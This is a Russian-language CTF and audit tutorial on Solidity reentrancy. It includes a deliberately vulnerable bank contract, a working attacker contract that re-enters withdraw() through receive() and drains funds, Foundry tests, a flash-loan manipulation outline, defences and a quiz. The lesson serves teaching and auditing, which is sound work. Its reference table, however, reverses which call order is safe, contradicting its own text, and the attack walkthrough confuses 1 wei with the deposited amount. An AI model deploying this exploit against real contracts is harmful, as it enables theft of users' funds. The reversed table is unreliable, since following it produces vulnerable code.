---
id: misc-blockchain-reentrancy
title: "Reentrancy и DeFi-атаки"
category: misc
parent: misc-blockchain
difficulty: hard
order: 3
tags: [reentrancy, defi, flashloan, solidity, exploit, ctf]
prerequisites: [misc-blockchain-solidity]
useful_for:
  - "CTF Blockchain категория"
  - "Аудит DeFi-протоколов"
  - "Разбор инцидентов"
estimated_minutes: 35
summary: "Классический reentrancy, cross-function и read-only варианты, защита checks-effects-interactions, flash-loan-комбо и полный PoC атакующего контракта."
---

Reentrancy (повторный вход) — исторически самая дорогая уязвимость смарт-контрактов: именно она обрушила The DAO в 2016 году. Суть проста: контракт вызывает внешний адрес до того, как обновил своё состояние, а внешний адрес в этом вызове снова дёргает уязвимую функцию — и получает больше, чем должен. В этом уроке вы напишете полноценный атакующий контракт и научитесь видеть варианты атаки.

## Уязвимый контракт

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "no balance");

        // 1) внешний вызов ДО обновления состояния — фатально
        (bool ok, ) = msg.sender.call{value: bal}("");
        require(ok, "send failed");

        // 2) обновление состояния происходит уже позже
        balances[msg.sender] = 0;
    }

    function balanceOf() external view returns (uint256) {
        return address(this).balance;
    }
}
```

Ошибка в порядке: сначала перевод, потом списание. Во время `msg.sender.call` управление уходит в контракт атакующего, и `balances[msg.sender]` ещё равен полному балансу.

## Атакующий контракт

```solidity
interface IVuln {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVuln public bank;
    uint256 public count;

    constructor(address _bank) { bank = IVuln(_bank); }

    // получаем эфир от банка и снова вызываем withdraw()
    receive() external payable {
        if (count < 5) {
            count++;
            bank.withdraw();
        }
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    // вывод похищенного
    function drain(address payable to) external {
        to.transfer(address(this).balance);
    }
}
```

Атака: `attack()` кладёт 1 wei, затем вызывает `withdraw()`. Банк отправляет 1 wei → срабатывает `receive()` → `withdraw()` снова → банк снова отправляет (баланс ещё не обнулён) → цикл повторяется `count` раз, каждый раз по 1 wei, но на самом деле по исходной сумме. Если `withdraw` переводит весь `balances[msg.sender]`, то каждый повторный вход переводит ту же сумму, пока в банке есть эфир.

## Запуск в Foundry

```bash
forge init reent && cd reent
# кладём контракты в src/, тест в test/
forge test -vvvv --match-test testReentrancy
```

```solidity
function testReentrancy() public {
    VulnerableBank bank = new VulnerableBank();
    vm.deal(address(this), 10 ether);
    // другие пользователи положили деньги
    bank.deposit{value: 5 ether}();

    Attacker atk = new Attacker(address(bank));
    atk.attack{value: 1 ether}();

    console.log("bank balance:", address(bank).balance);
    assertLt(address(bank).balance, 5 ether);
}
```

Ожидаемый вывод (упрощённо):

```
[PASS] testReentrancy()
bank balance: 0
```

## Разновидности reentrancy

| Вид | Описание | Пример |
|-----|----------|--------|
| Single-function | Повторный вход в ту же функцию | Классический `withdraw` |
| Cross-function | Вход в другую функцию, которая ещё верит старому состоянию | `withdraw` + `transfer` |
| Cross-contract | Вход через другой контракт протокола | Лендинги + токены |
| Read-only | Чтение несогласованного состояния во время вызова | Оракул/цена внутри callback |

Cross-function: контракт имеет `withdraw()` и `transfer()`; списание в `transfer` происходит после внешнего вызова, и через `withdraw` можно «переиспользовать» один и тот же баланс.

## Защита: checks-effects-interactions

Правильный порядок — сначала проверки, потом изменения состояния, только затем внешние вызовы:

```solidity
function withdraw() external {
    uint256 bal = balances[msg.sender];
    require(bal > 0);
    balances[msg.sender] = 0;              // effect ДО interaction
    (bool ok, ) = msg.sender.call{value: bal}("");
    require(ok);
}
```

Дополнительно ставят reentrancy guard:

```solidity
uint256 private locked = 1;
modifier nonReentrant() {
    require(locked == 1, "reentrant");
    locked = 2;
    _;
    locked = 1;
}
```

OpenZeppelin `ReentrancyGuard` делает ровно это. Ещё одна защита — использовать `transfer`/`send` (лимит 2300 газа) вместо `call`, но это плохая практика по другим причинам и не всегда спасает.

## Flash-loan-комбо

Flash loan — мгновенный заём без залога, который берут и возвращают в одной транзакции. Атакующий комбинирует его с манипуляцией ценой или reentrancy:

1. Берём flash loan на 10 000 000 USDC.
2. Опустошаем пул с низкой ликвидностью, искажая цену.
3. Эксплуатируем протокол, который доверяет этой цене.
4. Возвращаем заём + комиссию, забирая профит.

Оракул на `getReserves()` (spot-цена) уязвим; `Chainlink`/TWAP устойчивее.

## Частые ошибки и подводные камни

- Ставить `require` после внешнего вызова — проверка уже не спасает.
- Обновлять состояние в отдельной функции, которую тоже можно дёрнуть.
- Думать, что `nonReentrant` на одной функции защищает весь контракт (cross-function требует глобального guard).
- Забывать про `receive`/`fallback` — атакующий использует именно их.
- Игнорировать read-only reentrancy: view-функции могут отдавать несогласованное состояние другим протоколам.

## Что дальше / решение

Напишите PoC для Ethernaut уровня «Re-entrancy» и «Telephone» и прогоните через `forge test -vvvv`. Затем разберите реальные отчёты: The DAO (2016), Cream Finance, Curve/Vyper (2023). Переходите к `misc-blockchain-tools`, чтобы научиться воспроизводить реальные эксплойты на форке mainnet.

## Справочная таблица

| Паттерн | Безопасно? | Комментарий |
|---------|-----------|-------------|
| state update → external call | Нет | reentrancy |
| external call → state update | Да | checks-effects-interactions |
| `nonReentrant` | Да | блокирует повторный вход |
| `transfer` (2300 газ) | Частично | ломает совместимость, не универсально |
| spot-оракул | Нет | манипулируем flash loan |
| TWAP/Chainlink | Да | устойчивее к манипуляции |

## Дополнительная теория: газ, call vs transfer и приём эфира

Внешний вызов в Solidity бывает трёх видов, и это критично для reentrancy. `transfer`/`send` передают только 2300 газа — этого хватает на событие, но **не** на повторный вызов `withdraw`, поэтому исторически их использовали как «защиту» от reentrancy. Однако 2300 газа ломает совместимость с контрактами, у которых дорогой `receive`, и после EIP-1884 лимит стал недостаточен для некоторых случаев. `call{value:...}("")` передаёт весь оставшийся газ — именно он и открывает reentrancy. Правильная защита — не лимит газа, а **checks-effects-interactions** и guard.

Приём эфира контрактом происходит в `receive()` (для пустого calldata) или `fallback()`. Атакующий определяет `receive`, который снова вызывает уязвимую функцию. Без `receive`/`fallback` контракт не примет эфир (и вызов ревертнётся) — это тоже надо учитывать в PoC.

## Guard, mutex и альтернативы

`nonReentrant` реализуется через «мьютекс»: переменная-флаг. Варианты: глобальный флаг на контракт (защищает от cross-function), флаг на функцию, и даже защита через «статус операции». OpenZeppelin `ReentrancyGuard` использует два состояния (1/2). Для view-функций есть `nonReentrantView` (отдельный guard), потому что view-reentrancy — иной класс. Альтернативы: pull-over-push (жертва сама забирает средства, а не контракт отправляет), лимиты на объём, задержки вывода. Понимание этих паттернов нужно и для аудита: ищите, где состояние читается до обновления.

## Разбор ошибок и отладка

Если PoC «не реентрит» — проверьте, что `receive()` действительно вызывается (логируйте `count`), что газа хватает (не используйте `transfer`), и что состояние не обновляется до вызова. Если транзакция ревертится с «send failed» — возможно, у контракта нет `receive` или не хватает баланса. Если `forge test` показывает, что банк не опустошается — посчитайте: каждый повторный вход выводит `balances[msg.sender]`, который не меняется; при 1 wei депозите и полном балансе банка цикл выведет весь банк. Используйте `-vvvv` для трассировки: видно каждый вложенный `withdraw`. И проверяйте газ: слишком глубокий рекурсивный стек упрётся в лимит.

## Практический разбор: полный эксплойт в Foundry

Соберём всё вместе. Файл `test/Reent.t.sol`:

```solidity
contract Bank {
    mapping(address => uint) public bal;
    function deposit() external payable { bal[msg.sender] += msg.value; }
    function withdraw() external {
        uint b = bal[msg.sender];
        (bool ok,) = msg.sender.call{value: b}(""); require(ok);
        bal[msg.sender] = 0;
    }
}
contract Atk {
    Bank bank; uint c;
    constructor(Bank b){ bank = b; }
    receive() external payable { if (c++ < 5) bank.withdraw(); }
    function go() external payable { bank.deposit{value: msg.value}(); bank.withdraw(); }
}
contract T is Test {
    function test() public {
        Bank b = new Bank();
        vm.deal(address(this), 10 ether);
        b.deposit{value: 5 ether}();     // чужие деньги
        new Atk(b).go{value: 1 ether}(); // атака
        assertEq(address(b).balance, 0);
    }
}
```

Запуск:

```bash
forge test -vvvv --match-test test
```

Трассировка покажет вложенные `withdraw` и `receive`. Ожидаемо: банк опустошён, потому что каждый повторный вход выводит исходный `bal[msg.sender]`, который ещё не обнулён. Это ядро reentrancy. Теперь защитите контракт (обновите состояние до `call`) и убедитесь, что тест падает — так вы проверяете фикс. Такой цикл «эксплойт → фикс → проверка» — стандарт аудита.

## Квиз

```quiz
- question: "В чём корень классического reentrancy?"
  options:
    - "Внешний вызов происходит до обновления состояния"
    - "Используется `view`-функция"
    - "Отсутствует событие Event"
    - "Компилятор не оптимизирует газ"
  answer: 0
  explanation: "Состояние ещё старое, когда управление уходит наружу."
- question: "Какая последовательность безопасна?"
  options:
    - "interaction → effects → checks"
    - "checks → effects → interactions"
    - "interactions → checks → effects"
    - "effects → interactions → checks"
  answer: 1
  explanation: "Сначала проверки, потом изменения, только затем внешние вызовы."
- question: "Чем опасна read-only reentrancy?"
  options:
    - "view-функции отдают несогласованное состояние во время callback"
    - "Она крадёт газ"
    - "Она удаляет storage"
    - "Она ломает компиляцию"
  answer: 0
  explanation: "Другие протоколы читают ещё не обновлённые значения."
- question: "Что такое flash loan?"
  options:
    - "Мгновенный заём без залога в пределах одной транзакции"
    - "Кредит на 30 дней"
    - "Тип токена"
    - "Метод компиляции"
  answer: 0
  explanation: "Берётся и возвращается в одной транзакции."
- question: "Что блокирует `nonReentrant`-модификатор?"
  options:
    - "Повторный вход в защищённые функции"
    - "Все внешние вызовы"
    - "Только payable-функции"
    - "Чтение storage"
  answer: 0
  explanation: "Guard ставит флаг и запрещает реентерабельность."
```

## Где пригодится

- **CTF:** Blockchain/DeFi-задачи, часто с формулировкой «опустошите контракт».
- **Аудит:** обязательный пункт любого отчёта по смарт-контрактам.
- **Bug bounty:** крупнейшие награды в Web3 за reentrancy.
- **Работа:** incident response, разбор on-chain эксплойтов.
